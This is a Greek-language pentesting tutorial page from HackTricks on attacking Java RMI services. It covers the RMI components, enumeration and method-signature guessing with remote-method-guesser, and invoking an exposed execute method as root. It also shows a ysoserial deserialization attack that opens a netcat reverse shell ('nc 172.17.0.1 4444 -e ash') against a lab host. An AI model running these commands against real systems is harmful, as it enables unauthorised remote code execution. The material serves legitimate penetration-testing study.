# 1098/1099/1050 - Πεντεστική Java RMI - RMI-IIOP

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Βασικές Πληροφορίες

_Η απομακρυσμένη κλήση μεθόδων Java_, ή _Java RMI_, είναι ένας μηχανισμός ανταλλαγής μηνυμάτων μεταξύ αντικειμένων που επιτρέπει σε ένα αντικείμενο που βρίσκεται σε ένα _εικονικό μηχάνημα Java_ να καλεί μεθόδους σε ένα αντικείμενο που βρίσκεται σε ένα άλλο _εικονικό μηχάνημα Java_. Αυτό επιτρέπει στους προγραμματιστές να γράφουν κατανεμημένες εφαρμογές χρησιμοποιώντας ένα αντικειμενοστραφές παράδειγμα. Μια σύντομη εισαγωγή στο _Java RMI_ από επιθετική σκοπιά μπορεί να βρεθεί σε [αυτήν την blackhat ομιλία](https://youtu.be/t\_aw1mDNhzI?t=202).

**Προεπιλεγμένη θύρα:** 1090,1098,1099,1199,4443-4446,8999-9010,9999
```
PORT      STATE SERVICE      VERSION
1090/tcp  open  ssl/java-rmi Java RMI
9010/tcp  open  java-rmi     Java RMI
37471/tcp open  java-rmi     Java RMI
40259/tcp open  ssl/java-rmi Java RMI
```
Συνήθως, μόνο οι προεπιλεγμένοι συνιστώσες του _Java RMI_ (το _RMI Registry_ και το _Activation System_) είναι δεμένοι σε κοινές θύρες. Τα απομακρυσμένα αντικείμενα που υλοποιούν την πραγματική εφαρμογή _RMI_ συνήθως δένονται σε τυχαίες θύρες, όπως φαίνεται στην παραπάνω έξοδο.

Ο _nmap_ έχει μερικές φορές προβλήματα στον προσδιορισμό των προστατευμένων με _SSL_ υπηρεσιών _RMI_. Εάν συναντήσετε μια άγνωστη υπηρεσία ssl σε μια κοινή θύρα _RMI_, θα πρέπει να εξετάσετε περαιτέρω.

## Συστατικά του RMI

Απλοποιημένα, το _Java RMI_ επιτρέπει σε έναν προγραμματιστή να καταστήσει ένα αντικείμενο _Java_ διαθέσιμο στο δίκτυο. Αυτό ανοίγει μια θύρα _TCP_ όπου οι πελάτες μπορούν να συνδεθούν και να καλέσουν μεθόδους στο αντίστοιχο αντικείμενο. Παρόλο που αυτό ακούγεται απλό, υπάρχουν αρκετές προκλήσεις που το _Java RMI_ πρέπει να επιλύσει:

1. Για να αποστείλει μια κλήση μεθόδου μέσω _Java RMI_, οι πελάτες πρέπει να γνωρίζουν τη διεύθυνση IP, τη θύρα ακρόασης, την υλοποιημένη κλάση ή διεπαφή και το `ObjID` του στοχευμένου αντικειμένου (το `ObjID` είναι ένας μοναδικός και τυχαίος αναγνωριστικός αριθμός που δημιουργείται όταν το αντικείμενο γίνεται διαθέσιμο στο δίκτυο. Απαιτείται επειδή το _Java RMI_ επιτρέπει σε πολλά αντικείμενα να ακούνε στην ίδια θύρα _TCP_).
2. Οι απομακρυσμένοι πελάτες μπορεί να δεσμεύουν πόρους στον διακομιστή καλώντας μεθόδους στο αντίστοιχο αντικείμενο. Η _εικονική μηχανή Java_ πρέπει να παρακολουθεί ποιοι από αυτούς τους πόρους εξακολουθούν να χρησιμοποιούνται και ποιοι μπορούν να εξαλειφθούν.

Η πρώτη πρόκληση επιλύεται από το _RMI registry_, το οποίο είναι ουσιαστικά ένα υπηρεσία ονοματοδοσίας για το _Java RMI_. Το ίδιο το _RMI registry_ είναι επίσης μια _RMI υπηρεσία_, αλλά η υλοποιημένη διεπαφή και το `ObjID` είναι σταθερά και γνωστά από όλους τους πελάτες _RMI_. Αυτό επιτρέπει στους πελάτες _RMI_ να καταναλώνουν το _RMI registry_ απλά γνωρίζοντας την αντίστοιχη θύρα _TCP_.

Όταν οι προγραμματιστές θέλουν να καταστήσουν τα _Java αντικείμενά_ τους διαθέσιμα στο δίκτυο, συνήθως τα δένουν σε ένα _RMI registry_. Το _registry_ αποθηκεύει όλες τις πληροφορίες που απαιτούνται για να συνδεθεί κάποιος με το αντικείμενο (διεύθυνση IP, θύρα ακρόασης, υλοποιημένη κλάση ή διεπαφή και τιμή `ObjID`) και τις καθιστά διαθέσιμες με ένα αναγνώσιμο ανθρώπινο όνομα (το _bound name_). Οι πελάτες που θέλουν να καταναλώσουν την _RMI υπηρεσία_ ζητούν από το _RMI registry_ το αντίστοιχο _bound name_ και το registry επιστρέφει όλες τις απαιτούμενες πληροφορίες για τη σύνδεση. Έτσι, η κατάσταση είναι ουσιαστικά η ίδια με μια κανονική υπηρεσία _DNS_. Το παρακάτω παράδειγμα δείχνει ένα μικρό παράδειγμα:
```java
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import lab.example.rmi.interfaces.RemoteService;

public class ExampleClient {

private static final String remoteHost = "172.17.0.2";
private static final String boundName = "remote-service";

public static void main(String[] args)
{
try {
Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry
RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name
String response = ref.remoteMethod();                           // Call a remote method

} catch( Exception e) {
e.printStackTrace();
}
}
}
```
Το δεύτερο από τα παραπάνω προβλήματα λύνεται από τον _Κατανεμημένο Συλλέκτη Σκουπιδιών_ (_DGC_). Αυτή είναι μια άλλη υπηρεσία _RMI_ με μια γνωστή τιμή `ObjID` και είναι διαθέσιμη σε κάθε _RMI endpoint_. Όταν ένας _RMI client_ αρχίζει να χρησιμοποιεί μια _RMI service_, στέλνει μια πληροφορία στον _DGC_ ότι το αντίστοιχο απομακρυσμένο αντικείμενο χρησιμοποιείται. Ο _DGC_ μπορεί να παρακολουθεί τον μετρητή αναφορών και είναι σε θέση να καθαρίσει τα ανενεργά αντικείμενα.

Μαζί με τον αποσυντεθειμένο _Σύστημα Ενεργοποίησης_, αυτά είναι τα τρία προεπιλεγμένα στοιχεία του _Java RMI_:

1. Το _RMI Registry_ (`ObjID = 0`)
2. Το _Σύστημα Ενεργοποίησης_ (`ObjID = 1`)
3. Ο _Κατανεμημένος Συλλέκτης Σκουπιδιών_ (`ObjID = 2`)

Τα προεπιλεγμένα στοιχεία του _Java RMI_ έχουν γνωστά σημεία επίθεσης για αρκετό καιρό και υπάρχουν πολλά ευπάθειες σε παλαιές εκδόσεις _Java_. Από την οπτική γωνία του επιτιθέμενου, αυτά τα προεπιλεγμένα στοιχεία είναι ενδιαφέροντα, επειδή υλοποιούν γνωστές κλάσεις / διεπαφές και είναι εύκολο να αλληλεπιδράσετε με αυτά. Αυτή η κατάσταση είναι διαφορετική για προσαρμοσμένες _RMI services_. Για να καλέσετε μια μέθοδο σε ένα απομακρυσμένο αντικείμενο, πρέπει να γνωρίζετε εκ των προτέρων την αντίστοιχη υπογραφή της μεθόδου. Χωρίς να γνωρίζετε μια υπάρχουσα υπογραφή μεθόδου, δεν υπάρχει τρόπος επικοινωνίας με μια _RMI service_.

## Απαρίθμηση RMI

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) είναι ένα εργαλείο ανίχνευσης ευπαθειών _Java RMI_ που είναι ικανό να αναγνωρίζει αυτόματα κοινές ευπάθειες _RMI_. Κάθε φορά που ανιχνεύετε ένα _RMI_ endpoint, θα πρέπει να το δοκιμάσετε:
```
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```
Η έξοδος της ενέργειας απαρίθμησης εξηγείται λεπτομερώς στις [σελίδες τεκμηρίωσης](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/actions.md#enum-action) του έργου. Ανάλογα με το αποτέλεσμα, θα πρέπει να προσπαθήσετε να επαληθεύσετε τις εντοπισμένες ευπάθειες.

Οι τιμές `ObjID` που εμφανίζονται από το _remote-method-guesser_ μπορούν να χρησιμοποιηθούν για να προσδιοριστεί ο χρόνος λειτουργίας της υπηρεσίας. Αυτό μπορεί να βοηθήσει στον εντοπισμό άλλων ευπαθειών:
```
$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] ObjNum: 		-4004948013687638236
[+] UID:
[+] 	Unique: 	1442798173
[+] 	Time: 		1640761503828 (Dec 29,2021 08:05)
[+] 	Count: 		-32760
```
## Βίαιη επίθεση στις απομακρυσμένες μεθόδους

Ακόμα και όταν δεν έχουν εντοπιστεί ευπάθειες κατά τη διάρκεια της απαρίθμησης, οι διαθέσιμες υπηρεσίες _RMI_ μπορεί να αποκαλύπτουν επικίνδυνες λειτουργίες. Επιπλέον, παρόλο που η επικοινωνία _RMI_ με τα προεπιλεγμένα στοιχεία _RMI_ προστατεύεται από φίλτρα αποσυνεριοποίησης, όταν συνομιλείτε με προσαρμοσμένες υπηρεσίες _RMI_, τέτοια φίλτρα συνήθως δεν υπάρχουν. Η γνώση των έγκυρων υπογραφών μεθόδων στις υπηρεσίες _RMI_ είναι, συνεπώς, πολύτιμη.

Δυστυχώς, το _Java RMI_ δεν υποστηρίζει την απαρίθμηση μεθόδων σε _απομακρυσμένα αντικείμενα_. Ωστόσο, είναι δυνατό να εκτελεστεί βίαιη επίθεση στις υπογραφές των μεθόδων με εργαλεία όπως το [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ή το [rmiscout](https://github.com/BishopFox/rmiscout):
```
$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```
Οι εντοπισμένες μεθόδοι μπορούν να κληθούν ως εξής:
```
$ rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar
[+] uid=0(root) gid=0(root) groups=0(root)
```
Ή μπορείτε να εκτελέσετε επιθέσεις αποσυνερίας όπως αυτή:
```
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)

$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
```
Περισσότερες πληροφορίες μπορούν να βρεθούν σε αυτά τα άρθρα:

* [Επίθεση σε υπηρεσίες Java RMI μετά το JEP 290](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
* [Μάντεψη μεθόδων](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/method-guessing.md)
* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://bishopfox.com/blog/rmiscout)

Εκτός από τη μάντεψη, θα πρέπει επίσης να ψάξετε σε μηχανές αναζήτησης ή στο _GitHub_ για τη διεπαφή ή ακόμα και την υλοποίηση μιας συναντηθείσας υπηρεσίας _RMI_. Το _bound name_ και το όνομα της υλοποιημένης κλάσης ή διεπαφής μπορεί να είναι χρήσιμα εδώ.

## Γνωστές Διεπαφές

Το [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) σημειώνει τις κλάσεις ή τις διεπαφές ως `γνωστές` αν αναφέρονται στην εσωτερική βάση δεδομένων του εργαλείου για γνωστές υπηρεσίες _RMI_. Σε αυτές τις περιπτώσεις, μπορείτε να χρησιμοποιήσετε την ενέργεια `γνωστή` για να λάβετε περισσότερες πληροφορίες για την αντίστοιχη υπηρεσία _RMI_:
```
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]

$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```
## Shodan

* `port:1099 java`

## Εργαλεία

* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://github.com/BishopFox/rmiscout)
* [BaRMIe](https://github.com/NickstaDB/BaRMIe)

## Αναφορές
* [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

## Αυτόματες Εντολές HackTricks
```
Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.
Port_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.
Protocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out

Entry_1:
Name: Enumeration
Description: Perform basic enumeration of an RMI service
Command: rmg enum {IP} {PORT}
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
